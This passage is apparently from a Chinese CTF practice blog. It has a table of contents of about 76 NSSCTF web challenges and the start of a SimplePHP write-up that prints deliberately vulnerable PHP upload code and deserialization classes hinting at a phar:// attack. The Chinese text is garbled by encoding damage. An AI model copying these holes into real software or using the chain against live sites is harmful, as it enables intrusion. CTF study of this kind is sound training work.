href="#NISACTF-2022-hardsql"><span class="toc-number">6.</span> <span class="toc-text">[NISACTF 2022]hardsql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#October-2019-Twice-SQL-Injection"><span class="toc-number">7.</span> <span class="toc-text">[October 2019]Twice SQL Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%B9%8F%E5%9F%8E%E6%9D%AF-2022-%E7%AE%80%E5%8D%95%E7%9A%84php"><span class="toc-number">8.</span> <span class="toc-text">[é¹åŸæ¯ 2022]ç®€å•çš„php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-middlerce"><span class="toc-number">9.</span> <span class="toc-text">[NISACTF 2022]middlerce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2023-%E5%8D%8E%E5%8C%97-ez-date"><span class="toc-number">10.</span> <span class="toc-text">[CISCN 2023 ååŒ—]ez_date</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-babyupload"><span class="toc-number">11.</span> <span class="toc-text">[NISACTF 2022]babyupload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSAWQual-2019-Unagi"><span class="toc-number">12.</span> <span class="toc-text">[CSAWQual 2019]Unagi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E5%8C%97Day2-Web1"><span class="toc-number">13.</span> <span class="toc-text">[CISCN 2019ååŒ—Day2]Web1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Web11"><span class="toc-number">14.</span> <span class="toc-text">[CISCN 2019åä¸œå—]Web11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FSCTF-2023-%E6%98%AF%E5%85%84%E5%BC%9F%EF%BC%8C%E5%B0%B1%E6%9D%A5%E4%BC%A0%E4%BD%A0%E3%81%AE%F0%9F%90%8E%EF%BC%81"><span class="toc-number">15.</span> <span class="toc-text">[FSCTF 2023]æ˜¯å…„å¼Ÿï¼Œå°±æ¥ä¼ ä½ ã®ğŸï¼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-13-Basic-flask-jwt"><span class="toc-number">16.</span> <span class="toc-text">[NSSRound#13 Basic]flask?jwt?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GKCTF-2020-CheckIN"><span class="toc-number">17.</span> <span class="toc-text">[GKCTF 2020]CheckIN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF-2018-Easy-Audit"><span class="toc-number">18.</span> <span class="toc-text">[NCTF 2018]Easy_Audit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-1-Basic-basic-check"><span class="toc-number">19.</span> <span class="toc-text">[NSSRound#1 Basic]basic_check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GDOUCTF-2023-hate-eat-snake"><span class="toc-number">20.</span> <span class="toc-text">[GDOUCTF 2023]hate eat snake</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF-2018-Flask-PLUS"><span class="toc-number">21.</span> <span class="toc-text">[NCTF 2018]Flask PLUS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-level-up"><span class="toc-number">22.</span> <span class="toc-text">[NISACTF 2022]level-up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-Calculate"><span class="toc-number">23.</span> <span class="toc-text">[HUBUCTF 2022 æ–°ç”Ÿèµ›]Calculate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FSCTF-2023-CanCanNeed"><span class="toc-number">24.</span> <span class="toc-text">[FSCTF 2023]CanCanNeed</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B9%96%E6%B9%98%E6%9D%AF-2021-final-Penetratable"><span class="toc-number">25.</span> <span class="toc-text">[æ¹–æ¹˜æ¯ 2021 final]Penetratable</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2022-%E5%88%9D%E8%B5%9B-ezpop"><span class="toc-number">26.</span> <span class="toc-text">[CISCN 2022 åˆèµ›]ezpop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSCTF-2022-Spring-Recruit-babysql"><span class="toc-number">27.</span> <span class="toc-text">[NSSCTF 2022 Spring Recruit]babysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HDCTF-2023-YamiYami"><span class="toc-number">28.</span> <span class="toc-text">[HDCTF 2023]YamiYami</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-babyunser"><span class="toc-number">29.</span> <span class="toc-text">[SWPUCTF 2021 æ–°ç”Ÿèµ›]babyunser</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-WEEK3-ssssti"><span class="toc-number">30.</span> <span class="toc-text">[HNCTF 2022 WEEK3]ssssti</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GFCTF-2021-Baby-Web"><span class="toc-number">31.</span> <span class="toc-text">[GFCTF 2021]Baby_Web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easyphp"><span class="toc-number">32.</span> <span class="toc-text">[ç¾ŠåŸæ¯ 2020]easyphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SCTF-2021-loginme"><span class="toc-number">33.</span> <span class="toc-text">[SCTF 2021]loginme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96"><span class="toc-number">34.</span> <span class="toc-text">[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce-3"><span class="toc-number">35.</span> <span class="toc-text">[SWPUCTF 2021 æ–°ç”Ÿèµ›]hardrce_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B9%BF%E4%B8%9C%E5%BC%BA%E7%BD%91%E6%9D%AF-2021-%E5%9B%A2%E9%98%9F%E7%BB%84-love-Pokemon"><span class="toc-number">36.</span> <span class="toc-text">[å¹¿ä¸œå¼ºç½‘æ¯ 2021 å›¢é˜Ÿç»„]love_Pokemon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-2022-Node-Magical-Login"><span class="toc-number">37.</span> <span class="toc-text">[è¥¿æ¹–è®ºå‰‘ 2022]Node Magical Login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-2022-real-ez-node"><span class="toc-number">38.</span> <span class="toc-text">[è¥¿æ¹–è®ºå‰‘ 2022]real_ez_node</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ezpop"><span class="toc-number">39.</span> <span class="toc-text">[UUCTF 2022 æ–°ç”Ÿèµ›]ezpop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LitCTF-2023-Http-pro-max-plus"><span class="toc-number">40.</span> <span class="toc-text">[LitCTF 2023]Http pro max plus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AFCTF-2021-BABY-CSP"><span class="toc-number">41.</span> <span class="toc-text">[AFCTF 2021]BABY_CSP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-greatphp"><span class="toc-number">42.</span> <span class="toc-text">[æå®¢å¤§æŒ‘æˆ˜ 2020]greatphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-1-Basic-sql-by-sql"><span class="toc-number">43.</span> <span class="toc-text">[NSSRound#1 Basic]sql_by_sql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GFCTF-2021-ez-calc"><span class="toc-number">44.</span> <span class="toc-text">[GFCTF 2021]ez_calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E5%8C%97Day1-Web1"><span class="toc-number">45.</span> <span class="toc-text">[CISCN 2019ååŒ—Day1]Web1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MoeCTF-2021-%E5%9C%B0%E7%8B%B1%E9%80%9A%E8%AE%AF"><span class="toc-number">46.</span> <span class="toc-text">[MoeCTF 2021]åœ°ç‹±é€šè®¯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E5%8C%97Day1-Web2"><span class="toc-number">47.</span> <span class="toc-text">[CISCN 2019ååŒ—Day1]Web2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-Power"><span class="toc-number">48.</span> <span class="toc-text">[SWPUCTF 2022 æ–°ç”Ÿèµ›]Power!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ISITDTU-2019-EasyPHP"><span class="toc-number">49.</span> <span class="toc-text">[ISITDTU 2019]EasyPHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php"><span class="toc-number">50.</span> <span class="toc-text">[å®‰æ´µæ¯ 2019]easy_serialize_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="toc-number">51.</span> <span class="toc-text">[æŠ¤ç½‘æ¯ 2018]easy_tornado</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2020-Cookie-is-so-subtle"><span class="toc-number">52.</span> <span class="toc-text">[BJDCTF 2020]Cookie is so subtle!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-8-Basic-Upload-gogoggo"><span class="toc-number">53.</span> <span class="toc-text">[NSSRound#8 Basic]Upload_gogoggo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MoeCTF-2021-fake-game"><span class="toc-number">54.</span> <span class="toc-text">[MoeCTF 2021]fake game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-13-Basic-ez-factors"><span class="toc-number">55.</span> <span class="toc-text">[NSSRound#13 Basic]ez_factors</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-4-SWPU-1zweb-revenge"><span class="toc-number">56.</span> <span class="toc-text">[NSSRound#4 SWPU]1zweb(revenge)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Web4"><span class="toc-number">57.</span> <span class="toc-text">[CISCN 2019åä¸œå—]Web4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2"><span class="toc-number">58.</span> <span class="toc-text">[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#prize-p2"><span class="toc-number">59.</span> <span class="toc-text">prize_p2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSCTF-2nd-MyHurricane"><span class="toc-number">60.</span> <span class="toc-text">[NSSCTF 2nd]MyHurricane</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-EasyCleanup"><span class="toc-number">61.</span> <span class="toc-text">[ç¬¬äº”ç©ºé—´ 2021]EasyCleanup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HZNUCTF-2023-final-eznode"><span class="toc-number">62.</span> <span class="toc-text">[HZNUCTF 2023 final]eznode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%B9%A4%E5%9F%8E%E6%9D%AF-2021-EasyP"><span class="toc-number">63.</span> <span class="toc-text">[é¹¤åŸæ¯ 2021]EasyP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FSCTF-2023-%E7%AD%BE%E5%88%B0plus"><span class="toc-number">64.</span> <span class="toc-text">[FSCTF 2023]ç­¾åˆ°plus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2022-%E5%88%9D%E8%B5%9B-online-crt"><span class="toc-number">65.</span> <span class="toc-text">[CISCN 2022 åˆèµ›]online_crt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-PNG%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E5%99%A8"><span class="toc-number">66.</span> <span class="toc-text">[ç¬¬äº”ç©ºé—´ 2021]PNGå›¾ç‰‡è½¬æ¢å™¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GHCTF-2024-%E6%96%B0%E7%94%9F%E8%B5%9B-ezzz-unserialize"><span class="toc-number">67.</span> <span class="toc-text">[GHCTF 2024 æ–°ç”Ÿèµ›]ezzz_unserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-4-SWPU-ez-rce"><span class="toc-number">68.</span> <span class="toc-text">[NSSRound#4 SWPU]ez_rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASIS-2019-Unicorn-shop"><span class="toc-number">69.</span> <span class="toc-text">[ASIS 2019]Unicorn shop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-17-Basic-%E7%9C%9F%C2%B7%E7%AD%BE%E5%88%B0"><span class="toc-number">70.</span> <span class="toc-text">[NSSRound#17 Basic]çœŸÂ·ç­¾åˆ°</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-16-Basic-%E4%BA%86%E8%A7%A3%E8%BF%87PHP%E7%89%B9%E6%80%A7%E5%90%97"><span class="toc-number">71.</span> <span class="toc-text">[NSSRound#16 Basic]äº†è§£è¿‡PHPç‰¹æ€§å—</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPU-2016-web400"><span class="toc-number">72.</span> <span class="toc-text">[SWPU 2016]web400</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#De1ctf-2019-SSRF-Me"><span class="toc-number">73.</span> <span class="toc-text">[De1ctf 2019]SSRF Me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#prize-p4"><span class="toc-number">74.</span> <span class="toc-text">prize_p4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GKCTF-2020-ez%E4%B8%89%E5%89%91%E5%AE%A2-easynode"><span class="toc-number">75.</span> <span class="toc-text">[GKCTF 2020]ezä¸‰å‰‘å®¢-easynode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-V-Team-PYRCE"><span class="toc-number">76.</span> <span class="toc-text">[NSSRound#V Team]PYRCE</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        NSS-webåˆ·é¢˜
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Meteor_Kai</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-02-15T05:49:02.000Z" class="dt-published" itemprop="datePublished">2025-02-15</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Webå®‰å…¨</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/%E6%9D%82/" rel="tag">æ‚</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>NSSCTF web åˆ·é¢˜ï¼Œç£ä¿ƒè‡ªå·±ç”¨çš„ï¼Œå›¾å°±ä¸æ”¾äº†ï¼Œå¥½éº»çƒ¦å˜¤å˜¤å˜¤</p>
<h2 id="SWPU-2018-SimplePHP"><a href="#SWPU-2018-SimplePHP" class="headerlink" title="[SWPU 2018]SimplePHP"></a>[SWPU 2018]SimplePHP</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129090655640.png" alt="image-20241129090655640" style="zoom: 80%;" />

<p>ä¸€çœ¼ä»»æ„æ–‡ä»¶è¯»å–</p>
<p>è·å–ç›®å½•ä¸‹çš„æ–‡ä»¶</p>
<p><strong>index.php</strong></p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129090754383.png" alt="image-20241129090754383"></p>
<p><strong>function.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123; </span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">upload_file_check</span>()) &#123; </span><br><span class="line">        <span class="title function_ invoke__">upload_file_do</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><strong>class.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span 